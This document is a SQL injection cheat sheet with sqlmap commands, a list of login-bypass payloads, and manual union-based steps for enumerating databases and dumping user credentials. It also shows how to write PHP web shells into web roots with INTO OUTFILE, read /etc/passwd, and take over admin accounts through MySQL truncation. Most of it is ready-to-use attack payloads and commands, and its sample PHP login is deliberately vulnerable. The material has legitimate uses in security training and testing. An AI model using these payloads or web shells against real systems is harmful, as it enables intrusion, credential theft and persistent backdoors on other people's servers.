# SQL Injection

## SQL-injections {#sql-injections}

### Tldr {#tldr}

```text
# Post
./sqlmap.py -r request.txt -p username

# Get
sqlmap -u "http://192.168.1.101/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
```

## Background of SQL injection

So we have a website that is written in php. We have a login functionality, where the code looks like this:

```text
mysql_connect("localhost", "pelle", "mySecretPassowrd") or die(mysql_error());

mysql_select_db("myHomepage");

if ($_POST['uname'] != ""){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
    $result = mysql_query($query);
    $row = mysql_fetch_array($result);
}
```

So the user input is not filtered or sanitized in any way. Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login:

```text
whatever' or '1'='1
whatever' or '1'='1
```

The query will look like this:

```text
$query = "SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'";
```

Since they both become true the database will retrieve all users and we will be able to bypass the login.

If you know the username you could of course use that and then only inject on the password parameter.

```text
$query = "SELECT * FROM users WHERE username = 'admin' AND password='whatever' OR '1'='1'";
```

## SQLmap

Sqlmap is a great tool to perform sql-injections. Here is the manual. [https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

#### Using sqlmap with login-page {#using-sqlmap-with-login-page}

So you need to authenticate before you can access the vulnerable paramter.

You just cature the request using burp suite, and save the requiest in a file. Then your run

```text
sqlmap -r request.txt
```

Since the cookie is saved in the reuqest sqlmap can do it.

#### Crawl a page to find sql-injections {#crawl-a-page-to-find-sql-injections}

```text
sqlmap -u http://example.com --crawl=1
```

#### Dumping a database or table {#dumping-a-database-or-table}

Here we are dumping the database Webapp and the table Users.

```text
sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
```

#### Use proxy {#use-proxy}

```text
--proxy="http://192.2.2.2.2:1111"
```

**Proxy credencials**

```text
--proxy-cred="username:password"
```

## Login bypass

This is the most classic, standard first test:

```text
' or '1'='1
```

Then you have:

```text
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

## Manual SQL Injection

Sqlmap is good, but it is not very stealthy. And it can generate a lot of traffic. Also for more difficult injections you will need to understand what is happening behind the scenes with or without sqlmap to get a successfully injected query.

The two main ways to perform sql-injection: **error based** or **blind**.

#### Error-bases DB enumeration {#error-bases-db-enumeration}

If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure.

For example, if we have a url that ends with

```text
http://example.com/photoalbum.php?id=1
```

**Step 1 - Test with Single Quote  '**

First we should try to break the sql-syntaxt by adding a single or double quote `"` or `'`

```text
http://example.com/photoalbum.php?id=1'
```

If the page then returns a blank page or a page with a sql-error we know that the page is vulnerable.

**Step 2 - Enumerate columns**

So in order to enumerate the columns of a table we can use the **order by**

**Order by 1** means sort by values of the first column from the result set. **Order by 2** means sort by values of the second column from the result set.

The intended use of the `Order By` clause is to sort the table based on one of the columns in it. 

We can abuse this functionality by increasing the column number by 1 until we get an error. Ex. if 10 gives us an error then we know that there are 9 columns in the table we are working with.

```text
# This throws no error
http://example.com/photoalbum.php?id=1 order by 9
# This throws error
http://example.com/photoalbum.php?id=1 order by 10
```

So you just increase the number \(or do a binary tree search if you want to do it a bit faster\) until you get an error, and you know how many columns the table has.

**Step 3 - Find space to output db**

Now we need to know which coolumns are being outputed on the webpage. It could be that not all data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to the website.

To find out which columns are being displayed we can use the **union select** command. So we do the command like this

```text
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9
```

This will return the number of each column that is being shown on the page. Take note of which columns are displayed. \(This is where we are going to output the data we want to see\)

**Step 4 - Start enumerating the database**

If, for example, column number five is displayed on the page, we can start injecting new values into it.

Here is a list of data we can retrieve from the database. Some of the syntax may differ depending on the database engine \(mysql, mssql, postgres\).

```text
# Get username of the sql-user - user()
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9

# Get version - version()
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9

# Get all tables - table_name,...9 from information_schema.tables 
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# all columns of table - column_name from information_schema.columns where table_name = 'users'
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'

# Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,
password),6,7,8,9 FROM users
```

#### Blind sql-injection {#blind-sql-injection}

We say that it is blind because we do not have access to the error log. This make the whole process a lot more complicated. But it is of course still possible to exploit.

**Using sleep**

Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement.

```text
http://example.com/photoalbum.php?id=1-sleep(4)
```

If it loads for four seconds exta we know that the database is processing our sleep\(\) command.

#### Get shell from sql-injection {#get-shell-from-sql-injection}

The good part about MySQL from a hacker's perspective is that you can actaully use slq to write files to the system. This allows us to write a backdoor into the system.

**Load files**

UNION SELECT 1, load\_file\(/etc/passwd\) \#

```text
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

**Write files**

```text
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

**MSSQL - xp\_cmdshell**

You can run commands straight from the sql-query in MSSQL.

### Truncating Mysql Vulerability {#truncating-mysql-vulerability}

Basically this happens when you don't validate the length of user input. Two things are needed for it to work:

* MySQL does not make comparisons in binary mode. This means that `"admin"` and `"admin   "` are the same.
* If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can insert the following string

```text
admin               removed
```

This means that the "removed" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectively be inserted as "admin".

### References {#references}

[http://resources.infosecinstitute.com/sql-truncation-attack/](http://resources.infosecinstitute.com/sql-truncation-attack/) [http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) [http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/](http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/)

## SQL Injection - MySQL

### Exploitation

#### Common information

```text
SELECT version()
SELECT @@version
SELECT user()
SELECT system_user()
SELECT database()
SELECT @@datadir
SELECT @@hostname
```

#### Database name

```text
SELECT schema_name FROM information_schema.schemata
SELECT schema_name FROM information_schema.schemata WHERE schema_name=database()
```

#### Table names

```text
SELECT table_name FROM information_schema.tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
```

#### Column names

```text
SELECT column_name FROM information_schema.columns
SELECT column_name FROM information_schema.columns WHERE table_name='user'
SELECT column_name FROM information_schema.columns WHERE table_name='user' AND table_schema='mysql'
```

#### Dumping data

```text
SELECT user,password FROM user
SELECT user,password FROM mysql.user
```

#### Reading files:

```text
SELECT load_file('/etc/passwd')
```

#### Writing files:

```text
SELECT '<?php system($_GET[0]);?>' INTO OUTFILE('/tmp/test.php')
SELECT '<?php system($_GET[0]);?>' INTO DUMP FILE('/tmp/test.php')
```

#### MySQL user

```text
SELECT user,password FROM mysql.user
SELECT host,user,password FROM mysql.user
```

### Tricks

#### Strings

```text
SELECT user,password FROM mysql.user WHERE user='root'
SELECT user,password FROM mysql.user WHERE user=0x726f6f74
SELECT user,password FROM mysql.user WHERE user=char(0x72,0x6f,0x6f,0x74)
SELECT user,password FROM mysql.user WHERE user=char(114, 111, 111, 116)
```

#### Concat

```text
SELECT concat(user, 0x3a, password) FROM mysql.user
SELECT concat(user, 58, password) FROM mysql.user
```

#### Substring

```text
SELECT substr(user, 1, 1) FROM mysql.user
SELECT substring(user, 1, 1) FROM mysql.user
```

#### Select Nth Row

```text
SELECT host,user,password FROM mysql.user ORDER BY host LIMIT 1 OFFSET 0
SELECT host,user,password FROM mysql.user ORDER BY host LIMIT 1 OFFSET 1
```

#### Time Delay

```text
SELECT SLEEP(5)
SELECT BENCHMARK(1000000,MD5(‘A’))
```

#### If Statement

```text
SELECT IF(1=1, 'foo', 'bar')
SELECT IF(1=2, 'foo', 'bar')
```

### Other

#### Authentication Bypass

```text
SELECT password FROM mysql.user WHERE user='root' AND 1=2 UNION SELECT 'test'
SELECT password FROM mysql.user WHERE user='root' AND 1=2 UNION SELECT md5('test')
SELECT password FROM mysql.user WHERE user='root' AND 1=2 UNION SELECT sha1('test')
```

